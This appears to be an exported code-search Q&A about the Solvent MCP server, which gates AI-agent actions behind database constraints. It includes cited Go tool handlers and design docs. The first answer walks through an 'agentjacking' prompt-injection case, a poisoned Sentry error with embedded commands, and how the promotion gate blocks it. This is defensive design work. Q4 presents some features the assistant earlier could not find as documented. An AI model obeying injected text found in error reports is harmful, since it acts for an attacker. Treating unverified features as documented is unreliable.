The specific `internal/agentjacking` adapter, the `action_source`/`embedded_commands` fields, and the `demo:agentjacking` Taskfile target described in your pasted document **do not currently exist in the indexed Solvent codebase** — I found no matches for `agentjacking`, `action_source`, `embedded_commands`, `DetectCommands`, or `sentry_error` anywhere in the repo. This appears to be either a forthcoming/unmerged feature or content from a document not yet reflected in the index. Given the "Index coverage" limitation, if this demo genuinely exists in the repo, you may need to start a full Devin session to access it directly rather than relying on my search results.

That said, the document you pasted is fully consistent with the invariant architecture I *can* verify in the codebase, so I can explain accurately how the mechanism it describes maps onto real, indexed Solvent primitives.

## How the described defense maps to Solvent's real invariants

**The gate the doc calls `23503 · gate`** is the composite foreign key from `action_intent` to a promoted belief — the existing `IntentOnPromoted` kernel call, exposed via the `solvent_authorize_action` MCP tool, refuses unless the cited belief is currently `promoted` solvent:202-238 . The tool description itself instructs the calling agent not to pre-check status and to just attempt the call and report the database's answer solvent:181-203 .

**The `23514 · promoted_is_debt_free` refusal** the doc describes at Beat 5 is the real `Promote` invariant: a belief cannot move to `promoted` while any of the six debt items remain outstanding, enforced as a CHECK constraint, not application logic solvent:203-224 solvent:166-199 .

**Why a poisoned Sentry claim retiring zero debt matters** — this is the same mechanism as the etcd domain's evidence pipeline: a `provenance_class = external_feed` observation only produces a belief with `debt = kernel.FullDebt` (all six items open) unless a domain-specific claim-extraction rule explicitly maps it to debt retirement solvent:240-270 . The doc's claim that "`sentry_error` has no `DebtMapping` entry, so all six debts remain" is exactly this same structural gap applied to a new evidence source — no rule exists to retire debt from an `external_feed` observation, so the belief is structurally inert regardless of what text it contains.

**Why `action_source` being a lie doesn't matter** — this is the same "the agent owns reasoning, the MCP layer owns translation, the kernel owns transaction discipline, CockroachDB owns the invariants" separation already documented for the existing tools solvent:191-199 . Whatever an agent *claims* about where an instruction came from is caller-declared metadata at best; the only thing that determines whether `solvent_authorize_action` succeeds is whether the cited `belief_id` is actually `promoted` in CockroachDB — a fact the calling agent cannot fabricate through argument values, only through actually going through the promotion pipeline (debt retirement + `Promote`).

**Why "detection is decoration, structure is security" fits the existing design philosophy** — this mirrors the repo's stated principle that refusals are retained as first-class evidence rather than translated away, and that the *database's* SQLSTATE/constraint name is the product signal, not any upstream heuristic solvent:282-302 .

## What I can't verify

I could not locate: the `internal/agentjacking` package, the `sentry_error` / `sentry_error_nodetect` fixtures, the `action_source`/`embedded_commands` fields on `solvent_authorize_action`, the Layer 4 validation step, or the `task demo:agentjacking` target. If you need me to write this blog post against the *actual current* implementation rather than reconstructing it from the doc plus adjacent verified mechanisms, I'd need you to confirm the file paths or repo branch, since none of this surfaced in my searches of the indexed `PithomLabs/solvent` codebase.
### Citations
**File:** cmd/solvent-mcp/tools.go (L166-199)
```go
// handleSolventPromote attempts to promote a belief. The database refuses
// while the belief carries open debt (SQLSTATE 23514).
func handleSolventPromote(ctx context.Context, db *sql.DB, args map[string]interface{}) (*mcp.CallToolResult, error) {
	beliefID, ok := args["belief_id"].(string)
	if !ok || beliefID == "" {
		return errorResult(fmt.Errorf("belief_id is required and must be a string")), nil
	}
	scenario, _ := args["scenario"].(string)

	scenarioID, ok := scenarioToID[scenario]
	if !ok {
		return errorResult(fmt.Errorf("unknown scenario: %q (valid: track1, track2)", scenario)), nil
	}

	// Cross-scenario guard: verify the belief belongs to this scenario.
	snap, err := view.GetSnapshot(ctx, db, scenarioID, view.SnapshotOpts{BeliefID: beliefID})
	if err != nil || len(snap.Beliefs) != 1 || snap.Beliefs[0].ID != beliefID {
		return errorResult(fmt.Errorf("belief %s not found in scenario %s", beliefID, scenario)), nil
	}

	st := kernel.New(db)
	if err := st.Promote(ctx, beliefID); err != nil {
		return envelopeErrorResult(ctx, db, toolError(err), scenarioID), nil
	}

	audit, err := pipeline.AuditIntent(ctx, db, scenarioID)
	if err != nil {
		return errorResult(err), nil
	}

	return envelopeResult(db, map[string]interface{}{
		"belief_id": beliefID,
		"status":    "promoted",
	}, audit), nil
```
**File:** cmd/solvent-mcp/tools.go (L202-238)
```go
// handleSolventAuthorizeAction records a live intent to act on a belief.
// The database refuses unless the belief is currently promoted (SQLSTATE 23503).
func handleSolventAuthorizeAction(ctx context.Context, db *sql.DB, args map[string]interface{}) (*mcp.CallToolResult, error) {
	beliefID, ok := args["belief_id"].(string)
	if !ok || beliefID == "" {
		return errorResult(fmt.Errorf("belief_id is required and must be a string")), nil
	}
	scenario, _ := args["scenario"].(string)
	action, _ := args["action"].(string)

	scenarioID, ok := scenarioToID[scenario]
	if !ok {
		return errorResult(fmt.Errorf("unknown scenario: %q (valid: track1, track2)", scenario)), nil
	}

	// Cross-scenario guard: verify the belief belongs to this scenario.
	snap, err := view.GetSnapshot(ctx, db, scenarioID, view.SnapshotOpts{BeliefID: beliefID})
	if err != nil || len(snap.Beliefs) != 1 || snap.Beliefs[0].ID != beliefID {
		return errorResult(fmt.Errorf("belief %s not found in scenario %s", beliefID, scenario)), nil
	}

	st := kernel.New(db)
	if err := st.IntentOnPromoted(ctx, scenarioID, beliefID, action); err != nil {
		return envelopeErrorResult(ctx, db, toolError(err), scenarioID), nil
	}

	audit, err := pipeline.AuditIntent(ctx, db, scenarioID)
	if err != nil {
		return errorResult(err), nil
	}

	return envelopeResult(db, map[string]interface{}{
		"belief_id":    beliefID,
		"intent_state": "live",
		"action":       action,
	}, audit), nil
}
```
**File:** cmd/solvent-mcp/main.go (L181-203)
```go
	server.AddTool(&mcp.Tool{
		Name:        "solvent_authorize_action",
		Description: "Record a live intent to take a real-world action, citing a belief as its warrant. The database refuses unless the belief is currently promoted, returning constraint gate (SQLSTATE 23503). Call this when the user asks to authorize, deploy, or act on a belief. Do not pre-check the belief's status.",
		InputSchema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"scenario": map[string]any{
					"type":        "string",
					"enum":        []string{"track1", "track2"},
					"description": "Scenario the belief belongs to",
				},
				"belief_id": map[string]any{
					"type":        "string",
					"description": "UUID of the belief to cite as warrant",
				},
				"action": map[string]any{
					"type":        "string",
					"description": "Description of the real-world action to authorize",
				},
			},
			"required": []string{"scenario", "belief_id", "action"},
		},
	}, toolHandler("solvent_authorize_action"))
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L191-199)
```markdown
The agent does not get to decide that a belief is promotable or an intent is safe.

The MCP server is deliberately thin: validate input, call one kernel function, format the result. It does not implement belief semantics or SQL policy checks.

The kernel owns transaction discipline and reports the database result.

CockroachDB is the final invariant boundary.

The repository explicitly defines this division of responsibility: the agent owns reasoning, the MCP layer owns translation, the kernel owns transaction discipline, and CockroachDB owns the invariants. fileciteturn219file8L592-L623
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L203-224)
```markdown
## 7. The three database invariants that drive the demo

### I-1 — A promoted belief has no open debt

A `CHECK` constraint, `promoted_is_debt_free`, blocks promotion while review obligations remain open.

Observed demo failure:

```text
23514 · promoted_is_debt_free
```

This is why the first promotion attempt cannot simply "override" the review process.

### I-3 — A live intent must refer to a promoted belief

A composite foreign key named `gate` makes an action intent referentially impossible against a non-promoted belief.

Observed demo failure:

```text
23503 · gate
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L282-302)
```markdown
## 9. Why the refusal trail matters

Every refusal is retained as part of the audit trail.

The demo therefore leaves behind a chronology showing:

```text
authorize   → 23503 · gate
promote     → 23514 · promoted_is_debt_free
discharge   → 23514
retract     → 23514 · live_requires_promoted
```

This matters because a system that only reports its final state can hide how it got there.

Solvent keeps both:

1. **what happened**, and
2. **why the database refused it**.

The SQLSTATE and constraint name are treated as product evidence rather than translated away into generic UI language. fileciteturn219file5L280-L286
```
**File:** plans/PRD/DATA_PIPELINE_SPEC.md (L240-270)
```markdown
### 5.1 Rule: CVE in KEV → Enter Belief

**Trigger:** A new entry appears in CISA KEV for an etcd version.

**Action:**
1. Check if a belief with claim matching `"etcd {version} is vulnerable to {cve_id}"` already exists in the scenario.
2. If not: `EnterBelief` with claim type `derived`, debt = `FullDebt`.
3. `AddEvidence` with the KEV entry as evidence.
4. Retire debt items as evidence permits (see 5.3).

### 5.2 Rule: Fix Released → Strengthen Belief

**Trigger:** A release metadata event shows a version containing a fix for a known CVE.

**Action:**
1. Find the belief for the vulnerable version.
2. `AddEvidence` with the release metadata.
3. If the fix version is ≥ the vulnerable version, retire `needMap` (the mapping is known).
4. If the fix has been tested by the community (maintainer comments confirm), retire `needInvariant` and `needToyCheck`.

### 5.3 Rule: Maintainer Confirms → Retire Debt

**Trigger:** A maintainer comment confirms a fix is available and tested.

**Action:**
1. Match the comment to the relevant belief by CVE ID or version reference.
2. `RetireDebt` for the appropriate item:
   - "Fixed in v3.5.14" → retire `needMap`
   - "Tested in staging" → retire `needInvariant`, `needToyCheck`
   - "Confirmed no regression" → retire `needNullModel`, `needObstruction`
   - "Reviewed by security team" → retire `needFaithfulnessReview`
```
## Q4
what are the gaps that need to be filled in about the MCP workflow between Solvent and AI/coding/harness agents? I want it itemized with brief description organized around categories, make it non-technical, the goal is documentation for humans and AI agents
### Answer
Based on what's actually documented in the Solvent repo (its own "What NOT to Build" list, verified-limits sections, and forward-looking notes), here are the gaps in the MCP workflow between Solvent and any calling agent/harness — written for a general audience.

## Gap Inventory: Solvent ↔ Agent/Harness MCP Workflow

### 1. Who is allowed to call which tool

- **No caller identity or authentication.** The MCP server doesn't know or check who (which agent, which user, which session) is calling it — it currently treats every caller the same and relies on the connecting process being trusted solvent:560-582 .
- **No built-in role restriction on tools.** The tools that mutate state (retiring a review item, promoting a belief, cancelling a belief) are available to any caller of the server; nothing inside Solvent itself limits which agents may call them.
- **Tool restriction is left to whoever hosts the agent.** Solvent's design assumes the surrounding harness — not Solvent — decides which of its six tools a given agent is even allowed to attempt. If the host doesn't set that boundary, the "gap" isn't filled by Solvent.

### 2. What "authorized" actually covers

- **Authorization is coarse-grained today.** A promoted belief can currently back *any* stated action, not one specific, pre-approved action. This means a genuinely reviewed and approved belief could, in principle, be cited to justify a different action than the one it was actually reviewed for. Closing this (binding approval to an exact target-and-action pair) is called out as forthcoming work, not yet built.
- **The system trusts a caller's self-reported "where did this come from" label at face value for logging, but not for the real decision.** A caller can claim an instruction came from a trustworthy source, and that claim is recorded, but it is never treated as proof — the only thing that actually gates the action is the underlying review state. This is by design, but it means anyone reading Solvent's logs must remember that self-declared origin fields are hygiene/audit notes, not verified facts.

### 3. What happens outside the tool call

- **Solvent has no control over what an agent does without calling Solvent at all.** If an agent decides to skip Solvent's tools and act directly (run a command, call another API), nothing in Solvent detects or stops that. That responsibility sits entirely with the surrounding agent runtime (its sandboxing, permissions, network access), which is outside this project's scope.
- **No sandboxing, no network/egress controls, no credential isolation.** These are explicitly named as things Solvent does not attempt to provide.

### 4. How Solvent is reached and hosted

- **Only local, one-user, single-process connections are supported today.** The server talks over a local stdio connection; there's no remote/network-hosted version, and no login/session concept — it was deliberately built for a single local user rather than a shared, multi-tenant service solvent:560-582 .
- **No packaging for easy distribution.** There's no ready-made installer-style package; using it requires building the binary yourself, which raises friction for teams wanting to adopt it quickly.
- **A cloud-hosted database connection option exists but is not fully verified end-to-end** — it's configured but real-world reliability under that path hasn't been confirmed with a proper account/credential setup.

### 5. How much concurrent/multi-agent use has actually been tested

- **Testing so far covers one conversation at a time, plus a small number of hand-picked "race" scenarios** — not a broad stress test of many agents hitting the same records simultaneously. The guarantees are real for what was tested, but nobody should assume they've been proven at large swarm scale.
- **No claim about how this behaves at large scale (many agents, many records).** The demo is intentionally one small decision, one small belief history — it hasn't been shown to hold up with a big, complex web of interdependent decisions.

### 6. What gets recorded vs. what gets verified

- **Some automatic scanning for suspicious content is informational only, not a safeguard.** Any built-in detection of risky-looking text (like flagged command patterns) is meant for a human reviewer's attention, not as something the system relies on for safety — the real safety comes from the review/approval requirement itself, independent of whether anything suspicious was ever flagged.
- **Not every safety property has a saved, reviewable transcript proving it ran correctly.** Some checks exist and run, but their output isn't saved as a permanent record every time, so a reader has to trust the code rather than a log for those specific checks.

### 7. Compatibility across different agent tools

- **No compatibility testing across different AI coding tools/vendors was done.** The project verified it works with one client and documented configuration snippets for others, but did not test or guarantee behavior against every possible agent tool someone might connect.

---

**How to use this list:** each row above is a place where a team adopting Solvent (or an AI agent operating under it) must supply its own answer — usually at the "host" or "harness" layer around Solvent — rather than assuming Solvent already covers it. Solvent's own position is that it supplies one narrow, reliable piece (a review-and-approval gate on a shared record of beliefs and actions); everything above the line — identity, precise per-action approval, sandboxing, hosting, and scale-testing — still needs to be built or verified by whoever deploys it. solvent:560-582 solvent:547-586 solvent:506-519
### Citations
**File:** plans/mcp/plan_claude.md (L560-582)
```markdown
# 9. What NOT To Build

Ruthlessly. Each of these is a plausible good idea that costs more than it returns before the
deadline.

| Rejected | Why |
|---|---|
| **Authentication / authorization** | Local stdio server, one user, disposable database. Auth is pure cost. |
| **HTTP / SSE transport** | stdio is what local clients use and what `.mcp.json` configures. HTTP adds deployment, ports, and CORS for zero demo value. |
| **Remote deployment / hosting** | The whole playground is disposable and local. Hosting introduces uptime as a demo dependency. |
| **MCP resources and prompts** | Tools carry the entire demo. Resources would duplicate `solvent_ledger`; prompts would move the judge's script into the protocol, making it *less* visible. |
| **Sampling (server-initiated LLM calls)** | Inverts the architecture — Solvent would start reasoning. Directly contradicts §4. |
| **Progress notifications / streaming** | Every operation completes in milliseconds. |
| **npx / Docker packaging of the MCP server** | `go build` already runs in `task setup`. Packaging is a distribution concern, and this isn't being distributed. |
| **Arbitrary-URL or free-text evidence ingestion** | Destroys determinism, provenance, and offline operation in one move. Fixtures are hash-verified against `manifest.json`; keep it that way. |
| **A third scenario** | Two tracks already cover authorize-then-act and falsify-then-cancel. A third adds runtime, not insight. |
| **`belief_edge` population / multi-hop cascade** | Explicitly out of scope per the prompt, and the F1 limitation is already documented honestly. Implementing it here would also invalidate the frozen-core review. |
| **Client compatibility matrix testing** | Unbounded work for a claim nobody grades. One excellent client + config snippets + one screenshot. |
| **Caching or session state in the MCP server** | The server must be stateless. State lives in CockroachDB; a cache creates a second source of truth. |
| **A `force` / `override` / `admin` flag on any tool** | This is the single change that would falsify every argument in §7. Non-negotiable. |
| **Exposing `source_observed_at`** | See §10 note — the kernel doesn't persist it. Exposing `ingested_at` under an "observed" label would be the one genuinely dishonest move available in this design. |
| **A web UI / dashboard** | The prompt rules it out and the judges' own clients are the UI. |
| **Refactoring the CLI to share code with MCP** | The CLI is frozen and verified. Touching it risks the one thing that already works. |
```
**File:** docs.md (L547-586)
```markdown
# Part X — Limitations, honestly

**We do not claim the model is right.** Solvent constrains authority; it does not improve judgment.
An agent using it can still be wrong about everything. The guarantee is narrower and more defensible:
being wrong leaves a durable, attributable trail, and the authorization does not outlive the belief.

**We do not claim retrieval completeness.** The headline finding is a retrieval failure. Reframing
the query found `#14139`, but that reframing was a human act, and nothing in the system guarantees
someone will think of it.

**Concurrency scope.** The kernel transcript covers single-session behaviour. The control experiment
is the concurrency evidence, and it is three specific interleavings, not a general proof.

**No measured claim about index distribution.** What is verified is a CockroachDB-native vector index
with `vector_cosine_ops`, scenario-prefixed, plan-checked to use the index with bounded prefix spans,
on a multi-region cluster. We have not measured node count, range distribution or sharding, and do
not claim it.

**Some checks are code-backed without a committed transcript.** The corpus verification target, the
deploy preflight, and the vector-plan assertions all exist and run, but we do not ship recorded output
for each. Where that is true we cite the code, not a log that does not exist.

**Cloud Managed MCP is not verified.** It is configured and its unauthenticated `401` was observed,
but end-to-end verification is pending a service-account key. It is excluded from every claimed-tool
list. A configured endpoint is not a verified tool.

**The demo is one decision.** A single belief graph, two beliefs deep, one action. It is deliberately
small enough to hold in your head. It is not evidence that the model scales to a large belief
network, and we do not present it as such.

## What we would do next

- **Retire the positional binding.** Citations are currently bound to retrieval debts by selection
  order. That is deterministic and correct, but it is a convention rather than a stored fact. A
  column recording which debt a citation discharged would make it structural.
- **Concurrency beyond three cells.** The control experiment proves the mechanism; a broader
  randomized interleaving harness would characterise it.
- **Close the Cloud Managed MCP verification** with a real service-account key.
- **Belief networks of non-trivial size,** where "which beliefs does this authorization depend on"
  stops being obvious by inspection.
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L506-519)
```markdown
## 16. Verified limits and non-claims

To keep the repository technically honest:

- The demo does **not** claim perfect retrieval.
- Rank 573 is an offline measured rank, not a UI field.
- The project does **not** claim measured vector-index sharding/distribution.
- `40001` is described as a retry signal, not a refusal.
- Belief-graph traversal is application logic; CockroachDB does not recursively traverse the graph.
- Distributed Vector Indexing and ccloud CLI are the two verified CockroachDB tool claims.
- The composite FK and CHECK constraints are the core memory/authority architecture, not a separate rubric claim.
- The first two control cells and hardened cell were run against explicitly documented CockroachDB versions.

This discipline is intentional: the strongest claims in the repository are the ones the demo and database can actually prove.
```
